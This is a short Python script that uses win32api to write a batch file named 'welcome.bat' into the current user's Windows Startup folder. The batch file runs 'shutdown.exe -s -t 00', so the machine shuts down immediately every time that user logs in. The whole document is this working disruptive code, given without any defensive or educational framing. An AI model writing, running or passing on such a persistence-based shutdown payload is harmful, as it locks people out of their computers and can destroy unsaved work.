import win32api
path = 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\welcome.bat' %win32api.GetUserName()
f = open(path, 'w')
f.write("shutdown.exe -s -t 00 ")
f.close()

#the output file is stored in startup folder
